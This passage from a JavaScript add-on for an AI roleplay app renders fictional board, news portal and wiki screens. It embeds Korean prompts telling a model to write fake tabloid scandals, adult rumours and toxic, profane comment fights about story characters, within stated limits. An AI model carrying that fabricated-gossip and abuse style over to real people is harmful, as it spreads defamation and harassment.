        + (spots.length ? `<p class="bd-sec">📍 요즘 핫플</p><div class="bd-spots">${spots.map(s => `<span><b>${esc(s.name || '')}</b>${s.note ? `<small>${esc(s.note)}</small>` : ''}</span>`).join('')}</div>` : '')
        // 게시판마다 글 3개씩 미리 보기(제목 줄을 누르면 그 게시판으로)
        + boards.map(b => { const shown = new Set([...hot, ...latest].map(([, i]) => i)), list = all.filter(([p, i]) => p.board === b.name && !shown.has(i)).slice(0, 3); return list.length ? `<button class="bd-sec bd-more" data-act="bdboard" data-arg="${esc(b.name)}">${VIBE[b.vibe] || ''} ${esc(b.name)} <span>›</span></button><div class="bd-list">${list.map(row).join('')}</div>` : ''; }).join('')
        + `<p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="home">이미지로 저장</button></p>`;
    } else {
      const mine = all.filter(([p]) => p.board === cur), PER = 10, pages = Math.max(1, Math.ceil(mine.length / PER));
      const pg = Math.min(pages, Math.max(1, (nav.bdPage || {})[cur] || 1));
      const pager = pages > 1 ? `<div class="bd-pager">${pg > 1 ? `<button data-act="bdpage" data-arg="${esc(cur)}|${pg - 1}">‹</button>` : ''}${Array.from({ length: pages }, (_, k) => k + 1).filter(k => k === 1 || k === pages || Math.abs(k - pg) <= 2).map((k, j, a) => (j && k - a[j - 1] > 1 ? '<span>…</span>' : '') + `<button data-act="bdpage" data-arg="${esc(cur)}|${k}" aria-pressed="${k === pg}">${k}</button>`).join('')}${pg < pages ? `<button data-act="bdpage" data-arg="${esc(cur)}|${pg + 1}">›</button>` : ''}</div>` : '';
      inner = `<p class="bd-sec">${VIBE[vibeOf(cur)] || ''} ${esc(cur)} <small class="pdim">${esc(vibeOf(cur))} · 글 ${mine.length}개</small></p><div class="bd-list">${mine.slice((pg - 1) * PER, pg * PER).map(row).join('') || '<p class="pc-empty">글이 없어요</p>'}</div>${pager}
        <p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="board">이미지로 저장</button> · <button class="linkbtn" data-act="bddel" data-arg="board:${esc(cur)}">이 게시판 비우기</button></p>`;
    }
    return head + genCard() + `<div class="bd">${bar}${inner}</div><p class="muted" style="text-align:center;margin:10px 0 4px">${boardData.turns}턴 시점에 만든 커뮤니티${boardData.from ? ` · ${boardData.from}~${boardData.to}턴 대화 참고` : ''} · <button class="linkbtn" data-act="bdrange">다시 만들기</button></p>${nav.bdRange ? rangeSheet('다시 만들기') : ''}${nav.bdImg ? `<div class="imgsheet" data-act="imgclose"><img src="${nav.bdImg}" alt="커뮤니티 이미지"><p>이미지를 길게 눌러 '사진에 저장'을 고르세요 · 바깥을 누르면 닫혀요</p></div>` : ''}`;
  }
  // ── 📰 뉴스: 이야기 세계의 포털 뉴스(기사·실시간 검색어·댓글). 버튼을 눌렀을 때만 AI 1번, 결과는 이 브라우저에만 ──
  const NEWS_PROMPT = "너는 RP 세계 안의 음지 찌라시 포털 뉴스 화면을 만든다. 기자들은 사실상 음지 커뮤 출신이라 기사체 흉내만 낼 뿐 속은 막장이다. [기억 노트]나 [대화 원문]의 사건·인물로 쓴다.\n- 이 지침에는 일부러 예시 문장을 하나도 넣지 않았다. 제목·검색어·본문·댓글은 전부 이 이야기의 디테일로 처음부터 새로 짓는다. 상투 표현, 같은 말머리, 같은 말버릇을 되풀이하지 않는다. 다시 만들 때마다 전혀 다른 결과가 나와야 한다.\n- 짧고 세게: 기사는 길게 늘어놓지 않는다. 한 기사 = 한 방. 읽자마자 웃기거나 어이없어야 한다.\n- 구라는 화끈하게: 진짜·반반 기사는 노트·원문에 실제로 있는 씨앗(장면·지문·대사·물건·옷·장소·시간대·관계)에서 출발해 막장으로 부풀린다. 구라 기사는 씨앗 없이 아예 처음부터 지어낸 개웃긴 가짜뉴스도 된다: 인물들의 성격·관계·말버릇을 아는 사람이면 빵 터질 만큼 그럴듯하게 황당한 창작 사건. 사소한 일일수록 터무니없는 스케일로(나라가 뒤집히는 수준), 반전에 반전, 쌍방 폭로전, 엉뚱한 배후설, 음모론. 정색한 기사체로 쓸수록 더 웃기게.\n- 수위는 마라맛: 성인 인물의 연애·스킨십·성인 스캔들, 돈, 폭력 시비, 유출설, 갑질, 과거사를 의혹·소문으로 끝까지 키운다. 성인 인물에 대한 야한 유출설·성인 루머도 소문·헤드라인 수준으로는 된다. 노골적인 성행위 묘사는 쓰지 않는다.\n- 유저(사용자 캐릭터)는 기사에서 실명을 쓰지 않는다. 진짜 기사처럼 성에 모 씨를 붙이거나, 역할에 A씨처럼 가린다(검색어·댓글도 마찬가지로 실명 대신 가린 이름이나 별명). 유저의 대사·속마음은 지어내지 않고, 유저는 댓글을 쓰지 않는다. NPC는 실명으로 써도 된다.\n- 진짜와 구라를 섞는다: 기사마다 fact를 진짜|반반|구라 중 하나로. 진짜 1~2개·반반 1~2개·나머지 구라. 진짜·반반은 proof에 근거를 (N턴) \"원문 15~60자 그대로\" 형식으로(대사든 지문이든 원문 그대로). 구라는 proof 빈칸. 겉으로는 구분되지 않게.\n- 포털 이름 하나(지어낸 것, 실제 포털·언론사 이름 금지).\n- 실시간 검색어 10개: 사생활을 파고드는 악랄한 연관검색어와, 인물 이름에 원문 속 사소한 물건·행동을 붙여 대단한 사건처럼 이름 붙인 병맛 밈 조어를 반반. 열 개가 모두 다른 형태. state는 new|up|down|same.\n- 검색어마다 검색 결과: related(연관검색어 3~4개, 더 악랄하게), hits(조각 2개: src는 카페·블로그·지식인·SNS·동영상 중 서로 다르게, title과 한 줄 text, 출처마다 말투가 확 다르게).\n- 기사 5개. 다섯 개가 전부 다른 종류여야 한다: 스캔들 종류(연애·성인 루머·돈·폭력·유출·과거사·갑질·황당 사건 등)도, 매체 성격도, 제목 짜는 방식도, 진짜/반반/구라도 겹치지 않게 고루. cat은 속보·단독·연예·찌라시 중에서. 제목은 악랄한 낚시, 기사마다 제목 짜는 방식이 달라야 한다.\n- 본문 2~4문단, 문단마다 한두 문장. 익명 관계자 증언, 확인 안 된 정황, 어이없는 결론. 찌라시는 받은글 메신저 말투. 기사마다 사진 1장을 [사진: 이모지 2~6개 짧은 캡션] 한 줄로(이모지로 장면을 천박하고 웃기게, 기사마다 다른 조합).\n- 언론사·기자 이름은 지어낸 것.\n- 기사마다 댓글 8~12개. 댓글러마다 디시(갤러리마다 다름)·일베·메갈·워마드·더쿠·여시·인스티즈·네이트판·에펨·루리웹·엠팍·블라인드·에타·카페·맘카페·트위터(X)·오타쿠 커뮤 중 서로 다른 커뮤 말투로 부딪치게, 유행어·밈도 매번 다르게. 음지 커뮤 말투: 반말·초성체·비속어·병맛 드립·밈·말장난·받아치기, 일베식 어미와 메갈식 미러링 말투도 섞어 서로 싸우게(말투만, 현실 성별·지역·집단 멸칭은 금지). 진지한 댓글은 조롱당한다. 악플·조리돌림·음모론·편 가르기 싸움·기자 욕·쉴드 치다 역풍. 공감 1위는 제일 독하거나 제일 웃긴 댓글. 댓글끼리 말투와 드립이 하나도 겹치지 않게. 닉은 아이디 앞 네 글자에 별표 네 개로 가린 꼴.\n- 클린봇: 댓글 중 욕설·인신공격·성적 농담이 센 것에는 clean을 true로 둔다(화면에서 가려 두고, 눌러야 보이게 함). 수위를 낮추지 말고 그대로 쓰되 표시만 한다. 기사마다 2~4개쯤.\n- 댓글 이모지는 어울리는 댓글에만(조롱·비꼼·과몰입용으로, 사람마다 버릇이 다르게). 쓰는 양은 아래 주사위 줄을 따른다. 모든 댓글에 이모지가 붙으면 실패다. 기사 사진 캡션의 이모지 2~6개는 그대로 둔다.\n- 노트 인물(NPC)이 몰래 댓글을 다는 일은 아주 가끔(전체에서 0~1개): 그 인물 성격·말투 그대로, by에 그 인물 정본명. 그 인물이 모르는 정보는 쓰지 않는다.\n- 이 세계 안의 황색 보도일 뿐 RP 본편 설정은 아니다. 실제 원문 사건의 결과를 뒤집어 단정하지는 않는다.\n- 쓰지 않는 것: 미성년자(또는 나이가 확실하지 않은 인물)에 대한 성적인 내용, 현실의 특정 집단 혐오, 실존 인물·실존 언론사 이름.\n[출력] JSON 하나만. 설명·코드블록 금지.\n{\"portal\":\"\",\"trends\":[{\"word\":\"\",\"state\":\"new\",\"related\":[\"\"],\"hits\":[{\"src\":\"\",\"title\":\"\",\"text\":\"\"}]}],\"articles\":[{\"cat\":\"\",\"title\":\"\",\"press\":\"\",\"reporter\":\"\",\"ago\":\"\",\"views\":0,\"fact\":\"\",\"proof\":\"\",\"body\":\"\",\"comments\":[{\"nick\":\"\",\"text\":\"\",\"likes\":0,\"dislikes\":0,\"ago\":\"\",\"by\":\"\",\"clean\":false}]}]}";
  const NEWS_MORE = '\n\n[이번엔 \'새 이야기 반영\']\n- 이미 있는 포털에 방금 올라온 새 기사만 3~4개 쓴다. 기존 기사와 제목 짜는 방식·말머리·댓글 드립이 겹치지 않게. 포털 이름은 다시 만들지 않는다. JSON은 {"trends":[...],"articles":[...]} 하나만(기사 모양은 위와 같다).\n- 새 기사는 맨 아래 [새로 나온 대화]의 일을 주로 다룬다. ago는 방금·몇 분 전. 실시간 검색어 10개도 지금 기준으로 다시 낸다.\n- [이미 있는 기사 제목]과 겹치지 않게, 이어지는 후속 보도·반박 기사는 좋다.';
  const newsOf = async chatId => { try { return JSON.parse(String(await getValue('news:' + chatId, 'null')) || 'null'); } catch (_) { return null; } };
  let newsData = null;
  async function makeNews(from = 0, to = 0, update = false) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    const upd = update && newsData?.data ? newsData : null;
    if (upd) { from = recUpto(upd) + 1; to = turnEnd(); if (from > to) { toast('지난번 뒤로 새 대화가 없어요.', 'info', 2500); return; } }
    busyNow = true; startGen('news'); render(); toast(upd ? '새 기사를 불러오는 중이에요… (10~30초)' : '뉴스를 여는 중이에요… (30초~1분)');
    try {
      const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
      const who = users.length ? `[유저] ${users.join(', ')} — 이 사람의 댓글·대사는 만들지 말 것` : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공의 댓글·대사는 만들지 말 것';
      const base = snapshot.note ? ['[기억 노트]', noteMemory()] : [await etcMemory(chatId, upd ? upd.from : from, upd ? upd.to : to)];
      const more = upd ? ['', `[포털] ${upd.data.portal || ''}`, '[이미 있는 기사 제목]', (upd.data.articles || []).slice(0, 40).map(a => a.title).join('\n'), await rangeLogText(chatId, from, to, '새로 나온 대화 — 새 기사는 이 일들을 주로 다룰 것', 60000)]
        : snapshot.note ? [await rangeLogText(chatId, from, to, '이 장면들을 기사 화제로 특히 많이 쓸 것')] : [];
      const raw = await askModelRetry(withRules(NEWS_PROMPT, ETC_KO + etcRoll()) + (upd ? NEWS_MORE : ''), [who, wikiData?.data?.site ? '[같은 세계의 위키 이름] ' + wikiData.data.site + ' — 포털 이름도 같은 브랜드로 맞춘다' : '', '', ...base, ...more].join('\n'), upd ? '📰뉴스 새 기사' : '📰뉴스');
      let data; try { data = parseJsonLoose(raw); } catch (_) { throw new Error('AI 답을 읽지 못했어요. 한 번 더 눌러 주세요.'); }
      const strip = a => ({ ...a, comments: (a.comments || []).filter(c => !users.some(u => c.by === u || c.nick === u)) });
      if (upd) {
        const norm = t => String(t || '').replace(/[\s\p{P}\p{S}]/gu, ''), have = new Set((upd.data.articles || []).map(a => norm(a.title)));
        const batch = (upd.refreshed || 0) + 1, add = (data.articles || []).filter(a => a?.title && !have.has(norm(a.title))).slice(0, 10).map(a => ({ ...strip(a), batch }));
        if (!add.length) throw new Error('새 기사가 오지 않았어요. 한 번 더 눌러 주세요.');
        upd.data.articles = [...add, ...(upd.data.articles || [])].slice(0, 80); if ((data.trends || []).length) upd.data.trends = data.trends;
        upd.refreshed = batch; upd.upto = to;
      } else newsData = { at: Date.now(), turns: snapshot.note?.turns || 0, from, to, upto: to || turnEnd(), data: { ...data, articles: (data.articles || []).map(strip) } };
      await setValue('news:' + chatId, JSON.stringify(newsData));
      nav.nwArt = null; nav.nwCat = ''; toast(upd ? '새 기사가 올라왔어요 📰' : '뉴스가 열렸어요 📰', 'ok', 2500);
    } catch (e) { toast('뉴스 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  // [사진: 🍑👀📸 캡션] → 이모지는 크게, 캡션은 작게
  const photoHtml = (raw, cls) => { const t = String(raw || '').replace(/^\[사진\s*[:：]?\s*|\]$/g, '').trim(), m = t.match(/^[\p{Extended_Pictographic}\u200d\ufe0f\s]+/u), em = m ? m[0].trim() : '', cap = t.slice(m ? m[0].length : 0).trim();
    return `<p class="${cls}">${em ? `<span class="nw-em">${esc(em)}</span>` : ''}<small>${esc(cap || (em ? '' : t))}</small></p>`; };
  // 예전에 만든 뉴스처럼 검색 결과가 없는 검색어만, 누르면 그 검색어 결과를 따로 채움
  const NEWS_SEARCH = '너는 RP 세계 안 음지 찌라시 포털의 검색 결과를 만든다. [검색어]를 친 사람에게 보이는 화면이다. 예시 문장 없이 이 이야기 디테일로 새로 짓는다.\n- related: 연관검색어 4~6개. 검색어보다 더 깊이·악랄하게 파고들고, 원문 속 디테일을 비튼다.\n- hits: 검색 결과 조각 4개. src는 카페·블로그·지식인·SNS·동영상 중 서로 다르게. title과 한두 줄 text, 출처마다 말투가 확 다르게(트위터(X)·오타쿠 커뮤 말투도 섞어서). 서사 안의 씨앗에 매달린 구라·가십.\n- 유저(사용자 캐릭터)의 대사·속마음은 지어내지 않는다. 미성년자 성적 내용·현실 집단 혐오·실존 인물 이름 금지. 노골적인 성행위 묘사 금지.\n[출력] JSON 하나만: {"related":[""],"hits":[{"src":"","title":"","text":""}]}';
  let nwSearching = -1;
  async function newsSearch(n) {
    const chatId = chatIdFromPath(), tr = newsData?.data?.trends?.[n]; if (!chatId || !tr || busyNow || nwSearching >= 0) return;
    nwSearching = n; keepView();
    try {
      const base = snapshot?.note ? '[기억 노트]\n' + noteMemory() : await etcMemory(chatId, newsData.from, newsData.to);
      const titles = (newsData.data.articles || []).slice(0, 12).map(a => a.title).join('\n');
      const data = parseJsonLoose(await askModel(NEWS_SEARCH, `[검색어] ${tr.word}\n[포털] ${newsData.data.portal || ''}\n[지금 기사 제목]\n${titles}\n\n${base}`, '📰검색'));
      tr.related = data.related || []; tr.hits = data.hits || [];
      await setValue('news:' + chatId, JSON.stringify(newsData));
    } catch (e) { toast('검색 결과 불러오기 실패 · ' + e.message, 'err'); }
    finally { nwSearching = -1; keepView(); }
  }
  function newsHtml() {
    const head = devSeg();
    if (!snapshot?.note && !freshTurns()) return head + emptyBox('아직 대화가 없어요.');
    const sheet = nav.bdRange && nav.rgKind === 'news' ? rangeSheet(newsData ? '다시 만들기' : '만들기') : '';
    if (!newsData && busyNow && genProg) return head + genCard();
    if (!newsData) return head + genCard() + `<div class="bd"><div class="bd-empty"><b>이 세계의 뉴스</b><small>속보·단독·연예·찌라시 기사와 실시간 검색어를 한 번에 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small><button class="ph-make" data-act="nwrange">📰 뉴스 열어 보기</button></div></div>${sheet}`;
    const d = newsData.data || {}, arts = d.articles || [], trends = (d.trends || []).slice(0, 10);
    const cats = [...new Set(arts.map(a => a.cat).filter(Boolean))];
    const open = nav.nwArt != null && arts[nav.nwArt] ? arts[nav.nwArt] : null, cur = !open && cats.includes(nav.nwCat) ? nav.nwCat : '';
    const seen = nav.bdSeen || (nav.bdSeen = new Set());
    const npcOf = by => { const c = canon(by); return c && (CANON.includes(c) || PROF.has(c)) && !PROF.get(c)?.isUser ? c : ''; };
    const reveal = (by, key) => { const w = npcOf(by); return w ? `<button class="bd-by" data-act="bdwho" data-arg="${esc(key)}">${seen.has(key) ? `✍ ${esc(w)}` : '작성자 몰래 보기'}</button>` : ''; };
    const nwSeen = () => nav.nwOpen || (nav.nwOpen = new Set());
    const cmtN = a => (a.comments || []).length, fresh = a => !!a.batch && a.batch === newsData.refreshed;
    const tag = a => a.cat ? `<em class="nw-cat${/속보|단독/.test(a.cat) ? ' hot' : ''}">${esc(a.cat)}</em>` : '';
    const row = ([a, i]) => `<button class="bd-row" data-act="nwgo" data-arg="${i}"><b>${tag(a)}${esc(a.title || '')}${cmtN(a) ? ` <span class="bd-cn">[${cmtN(a)}]</span>` : ''}${fresh(a) ? ' <em class="bd-n">NEW</em>' : ''}</b><small>${esc(a.press || '')} · ${esc(a.ago || '')}${a.views ? ` · 조회 ${fmt(a.views)}` : ''}</small></button>`;
    const nm = '랙시뉴스', [c1, c2] = boardColors(nm);
    // 포털처럼: 로고 글자 + 검색창(1위 검색어가 떠 있음) + 날짜 줄
    const bar = `<div class="nw-top"><b class="nw-logo" style="color:${c1}">${esc(nm)}</b><span class="nw-search" style="border-color:${c1}"><span>${esc(trends[0]?.word || '')}</span><i style="background:${c1}">🔍</i></span></div>
      <p class="nw-date">${phClock().t} 기준 · 기사 ${arts.length}건${arts.some(a => /진짜/.test(a.fact)) ? ` · 이 중 진짜는 ${arts.filter(a => /진짜/.test(a.fact)).length}개` : ''}</p>`;
    const all = arts.map((a, i) => [a, i]); let inner;
    const tr = !open && nav.nwTrend != null ? trends[nav.nwTrend] : null;
    if (tr) {
      // 검색 결과: 낱말이 겹치는 기사 + AI가 쓴 검색 조각
      const words = String(tr.word || '').split(/\s+/).filter(w => w.length >= 2), hitArt = all.filter(([a]) => words.some(w => (a.title + ' ' + a.body).includes(w))).slice(0, 4);
      const src = { 카페: '☕', 블로그: '📝', 지식인: '❓', SNS: '🐦', 동영상: '▶' };
      inner = `<div class="nw-sr"><p class="bd-crumb"><button data-act="nwtrend" data-arg="">‹ 메인</button></p><p class="nw-q">'<b>${esc(tr.word || '')}</b>' 검색 결과</p>
          ${(tr.related || []).length ? `<p class="nw-sub">연관검색어</p><div class="nw-rel">${tr.related.map(w => `<span>${esc(w)}</span>`).join('')}</div>` : ''}
          ${hitArt.length ? `<p class="nw-sub">뉴스</p><div class="bd-list">${hitArt.map(row).join('')}</div>` : ''}
          ${(tr.hits || []).length ? `<p class="nw-sub">카페·블로그·지식인</p>${tr.hits.map(h => `<div class="nw-hit"><small>${src[h.src] || '·'} ${esc(h.src || '')}</small><b>${esc(h.title || '')}</b><p>${esc(h.text || '')}</p></div>`).join('')}` : ''}
          ${nwSearching === nav.nwTrend ? '<p class="nw-sub"><span class="dots"><i></i><i></i><i></i></span> 검색 결과 불러오는 중…</p>' : !(tr.hits || []).length ? `<p class="nw-sub"><button class="linkbtn" data-act="nwsearch" data-arg="${nav.nwTrend}">카페·블로그·지식인 검색 결과 불러오기 (AI 1번)</button></p>` : ''}</div>
        <p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="home">이미지로 저장</button></p>`;
    } else if (open) {
      const a = open, cs = [...(a.comments || [])].sort((x, y) => (y.likes || 0) - (x.likes || 0));
      inner = `<div class="bd-post"><p class="bd-crumb"><button data-act="nwcat" data-arg="">‹ 메인</button></p>
          <h4>${tag(a)}${esc(a.title || '')}</h4>
          <p class="nw-meta"><b>${esc(a.press || '')}</b> · ${esc(a.reporter || '')} · ${esc(a.ago || '')}${a.views ? ` · 조회 ${fmt(a.views)}` : ''}</p>
          <div class="bd-body nw-body">${String(a.body || '').split('\n').filter(l => l.trim()).map(l => /^\[사진/.test(l.trim()) ? photoHtml(l.trim(), 'nw-photo') : `<p>${mdLite(esc(l))}</p>`).join('')}</div>${(() => { const on = (nav.nwFact || new Set()).has(nav.nwArt), f = /진짜/.test(a.fact) ? ['✅', '진짜'] : /반/.test(a.fact) ? ['🤏', '반반'] : a.fact ? ['🧢', '구라'] : null;
            return f ? `<div class="nw-fact">${on ? `<p><b>${f[0]} ${f[1]}</b>${a.proof ? ` · 근거 ${esc(a.proof)}` : f[1] === '구라' ? ' · 원문에 없는 얘기예요' : ''}</p>` : ''}<button class="linkbtn" data-act="nwfact">${on ? '팩트체크 닫기' : '🔍 팩트체크'}</button></div>` : ''; })()}</div>
        <div class="bd-cmts"><p class="bd-ch">댓글 <b>${cmtN(a)}</b>개 · 공감순</p>${cs.map((c, k) => `<div class="bd-c"><p class="bd-cw"><b>${esc(c.nick || '익명')}</b> ${reveal(c.by, `n${nav.nwArt}:${k}`)}<small>${esc(c.ago || '')}</small></p>${c.clean && !nwSeen().has(`${nav.nwArt}:${k}`) ? `<p class="bd-ct nw-hid"><button data-act="nwclean" data-arg="${nav.nwArt}:${k}">🤖 클린봇이 가린 댓글 · 눌러서 보기</button></p>` : `<p class="bd-ct">${esc(c.text || '')}</p>`}<p class="nw-react"><span>공감 ${fmt(c.likes || 0)}</span><span>비공감 ${fmt(c.dislikes || 0)}</span></p></div>`).join('')}</div>
        <p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="post">이미지로 저장</button></p>`;
    } else {
      const ar = st => st === 'new' ? '<i class="nw-tn">NEW</i>' : st === 'up' ? '<i class="nw-tu">▲</i>' : st === 'down' ? '<i class="nw-td">▼</i>' : '<i class="nw-ts">–</i>';
      inner = (!cur && trends.length ? `<p class="bd-sec">🔎 실시간 검색어</p><div class="bd-rank nw-trends">${trends.map((t, n) => `<button data-act="nwtrend" data-arg="${n}"><em>${n + 1}</em><span>${esc(t.word || '')}</span>${ar(t.state)}</button>`).join('')}</div>` : '')
        + `<p class="bd-sec">📰 많이 본 뉴스</p><div class="bd-list">${all.map(row).join('') || '<p class="pc-empty">기사가 없어요</p>'}</div>` + `
        <p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="home">이미지로 저장</button></p>`;
    }
    const end = turnEnd(), up = recUpto(newsData);
    return head + genCard() + `<div class="bd">${bar}${inner}</div><p class="muted" style="text-align:center;margin:10px 0 4px">${newsData.turns}턴 시점에 만든 뉴스${newsData.from ? ` · ${newsData.from}~${newsData.to}턴 대화 참고` : ''} · <button class="linkbtn" data-act="nwrange">다시 만들기</button>${end > up ? ` · <button class="linkbtn" data-act="nwupd"${busyNow ? ' disabled' : ''}>새 이야기 반영 (${up + 1}~${end}턴)</button>` : ''}</p>${sheet}${nav.bdImg ? `<div class="imgsheet" data-act="bdimgx"><img src="${nav.bdImg}" alt=""><small>길게 눌러 저장하세요</small></div>` : ''}`;
  }
  // ── 📚 나무위키 · 📺 실시간톡: 커뮤니티·뉴스와 같은 틀 ──
  const WIKI_PROMPT = "너는 RP 세계 안의 위키 사이트(나무위키 같은 집단 편집 위키)를 만든다. [기억 노트]나 [대화 원문]의 인물·사건·장소로 문서를 쓴다.\n- 이 지침에는 일부러 예시 문장을 넣지 않았다. 문서 제목·본문·드립·토론·편집 요약은 전부 이 이야기 디테일로 새로 짓는다. 상투 표현과 같은 드립을 되풀이하지 않는다.\n- 위키 이름 하나(지어낸 것, 실제 사이트 이름 금지).\n- 문서 6~8개: 노트 인물마다 하나, 큰 사건·장소·관계 문서 몇 개. kind는 인물|사건|장소|관계|밈.\n- 편집자들은 음지 커뮤 출신 위키러다: 정색한 백과사전체 흉내 속에 취소선 드립(~~지운 척하는 진심~~), 각주 드립, 카더라, 과몰입 TMI, 사소한 디테일 집착, 은근한 비꼼, 고자극 가십을 섞는다. 노골적인 성행위 묘사는 쓰지 않는다.\n- 문서마다 sections 3~5개(개요·상세·논란 및 사건 사고·어록·여담 같은 위키식 목차를 문서마다 다르게). 본문 문장 끝에 [1]처럼 각주 번호를 달고, notes에 각주 내용. 각주 일부는 근거: (N턴) \"원문 15~60자 그대로\"(대사든 지문이든 원문 그대로). 나머지 각주는 드립·카더라·편집자 사담.\n- 논란 및 사건 사고 칸은 서사 속 씨앗을 악의적으로 부풀린 의혹과 아예 지어낸 골때리는 루머를 섞는다(루머는 루머라고 써 둔다).\n- talk(토론) 4~8줄: 문서 한 줄 표현을 두고 편집자들이 음지 말투(디시·일베·메갈·더쿠·에펨 등 서로 다른 말투)로 싸운다. 비속어·조롱 세게, 현실 성별·지역·집단 멸칭은 금지.\n- history(편집 역사) 4~6줄: 편집 전쟁·반달·되돌림·보호 요청이 보이게. who는 아이피나 위키 닉, what은 편집 요약.\n- lock은 보호 상태 한 단어(없으면 빈 칸).\n- 유저(사용자 캐릭터)도 문서가 있고, 비난·조롱·편들기·악플·루머 대상이 되는 것까지 다 열려 있다. 다만 유저의 속마음·대사는 지어내지 않고 겉으로 보인 일로만. 편집자·토론 참가자로 유저를 쓰지 않는다.\n- 노트 인물(NPC)이 몰래 편집하거나 토론에 끼는 일은 아주 가끔(전체에서 0~1개): by에 그 인물 정본명, 그 인물 성격 그대로, 모르는 정보는 쓰지 않는다.\n- 쓰지 않는 것: 미성년자(또는 나이가 확실하지 않은 인물)에 대한 성적인 내용, 현실 집단 혐오, 실존 인물·사이트 이름.\n[출력] JSON 하나만. 설명·코드블록 금지.\n{\"site\":\"\",\"docs\":[{\"title\":\"\",\"kind\":\"\",\"lock\":\"\",\"summary\":\"\",\"sections\":[{\"h\":\"\",\"body\":\"\"}],\"notes\":[\"\"],\"talk\":[{\"nick\":\"\",\"text\":\"\",\"by\":\"\"}],\"history\":[{\"who\":\"\",\"what\":\"\",\"ago\":\"\",\"by\":\"\",\"clean\":false}]}]}";
  const WIKI_MORE = "\n\n[이번엔 '새 이야기 반영']\n- 이미 있는 위키에 [새로 나온 대화]의 일을 반영한다. 기존 문서 중 바뀐 문서는 같은 title로 sections를 덧붙이거나 고친 전체 문서로, 새로 생길 만한 문서는 새로 쓴다(바뀐 문서·새 문서만 2~4개). history에는 이번 편집이 맨 위에 보이게.\n- JSON은 {\"docs\":[...]} 하나만(문서 모양은 위와 같다).";
  const LIVE_PROMPT = "너는 RP를 드라마로 보고 실시간으로 떠드는 시청자 채팅방을 만든다. [대화 원문]/[기억 노트]의 이번 회차 장면을 시청자들이 지금 막 보고 있다.\n- 이 지침에는 일부러 예시 문장을 넣지 않았다. 채팅·드라마 제목·클립 제목은 전부 이 이야기 디테일로 새로 짓는다. 상투 표현·같은 드립을 되풀이하지 않는다.\n- 드라마 제목 하나(이 이야기에 어울리게 지어낸 것), 이번 화 부제 하나, 시청률(rating, 소수점 한 자리 %). [이어서 방송]이면 제목·부제는 빈 칸으로 두고 앞 채팅 흐름을 이어 간다. [바로 앞 채팅] 끝에 검열된 자막(▒▒ 검열됨)이 있으면, 첫 반응 몇 줄은 검열·모자이크에 대한 불만, 모자이크 너머 상상, 방송 심의 드립으로 시작한다(노골적인 묘사는 쓰지 않는다).\n- chat은 이번에 보내는 턴 범위를 처음부터 끝까지 순서대로, 개난장판으로. 채팅은 원문을 따라간다: 원문의 턴마다 반응 포인트가 될 줄을 1~3줄씩(빠뜨리는 턴 없이) 순서대로 골라 자막 줄로 넣는다. 자막의 절반 이상은 지문이다: 인물이 어떻게 행동하는지(표정·눈빛·몸짓·손동작·거리·숨·침묵·분위기) 보이는 줄을 대사보다 많이 고르고, 대사는 꼭 터질 줄만. 지문 자막 뒤엔 그 행동을 하나하나 실황 중계하고 해석하고 놀리는 반응이 붙는다. 자막 줄 {\"line\":\"원문 그대로 15~80자\",\"kind\":\"대사|지문\",\"turn\":원문 턴 번호,\"rate\":그 순간 분당 시청률(소수점 한 자리 %)}로 넣고(시청률은 터지는 줄에서 확 오르고 지루한 줄에서 떨어진다), 그 바로 뒤에 시청자들이 5~10줄씩 그 대사·행동에 반응한다: 방금 나온 대사를 그대로 따라 치며 조롱하기, 말투 비틀어 패러디, 밈으로 만들기, 오글거린다고 비명, 지문 속 행동 하나하나 실황 중계, 짤 박제 선언, 성대모사 도배. 이야기가 어떻게 흘러가는지 시청자 반응만 봐도 보이게. 자막은 원문을 고치지 말고 그대로. 단 원문에 수위 높은 성적인 장면이 있으면 노골적인 부분은 옮기지 않고 그 행동을 에둘러 한 줄로 요약한 자막(앞에 🔞)으로 쓰고, 시청자는 비명·드립·암시로 반응한다(노골적인 묘사 금지). 터지는 줄엔 채팅·후원이 몰리고, 밋밋한 줄은 조용하게(줄마다 반응 크기가 확 달라야 한다). 나머지는 시청자 채팅 한 줄씩: 고자극 음지 말투(디시·일베·메갈·더쿠·여시·에펨·인스티즈·트위터(X)·오타쿠 커뮤 등 서로 다른 말투), 과몰입·비명·커플 이름 짓기·작가 욕·배우 외모 품평·다음 전개 예측·악플·싸움·병맛 드립·밈. 시청자 유형을 섞는다: 인물한테 훈수 두는 사람, 남 말 안 듣고 지 말만 하는 사람, 같은 말 도배하는 도배충, 뒷북, 스포 하는 척, 정주행 중이라는 사람, 화면 밖 TMI. 말 짧게, 같은 사람도 여러 번 나온다.\n- 후원 줄은 아주 가끔(이번에 보내는 턴 범위 전체에서 0~1개, 진짜 터지는 장면에만): {\"donate\":금액,\"nick\":\"\",\"text\":\"\"} 꼴로 별풍선·후원이 터지며 짧은 요구나 드립(장면 다시 보여 줘, 키스신 가자, 작가 정신 차려 등을 이 장면에 맞게 새 말로). 금액은 1천~10만 사이 제각각, 큰 후원엔 채팅이 들썩인다. 현실 성별·지역·집단 멸칭은 금지, 노골적인 성행위 묘사 금지.\n- 닉네임은 거의 겹치지 않게: 줄 수만큼 다양하게, 커뮤 닉 스타일(영문 아이디·초성·드립 닉·고닉·숫자 붙은 닉·팬 닉·안티 닉 등)을 섞는다. 같은 사람이 여러 번 나올 땐 같은 닉으로.\n- 시청자 중엔 야한 단어만 도배하는 음담패설러(단어 도배·드립 수준, 노골적인 묘사는 쓰지 않음)와 일부러 반대로 말하고 커플 까고 싸움 붙이고 뜬금 홍보하는 분탕러도 섞여 있다. 다른 시청자들이 강퇴·신고·무시로 반응한다.\n- 채팅에 이모지를 자주 섞고, 가끔(5턴에 2~4번) 큰 스티커 이모티콘 줄 {\"sticker\":\"이모지 1~3개\"}도 날린다. 장면 감정에 맞게 매번 다른 조합.\n- 원문 장면에 딱 붙어 반응한다: 대사 한 줄, 지문 속 행동·물건·표정에 바로 반응해 \"그 장면\"을 알아보게.\n- 노트 인물(NPC)을 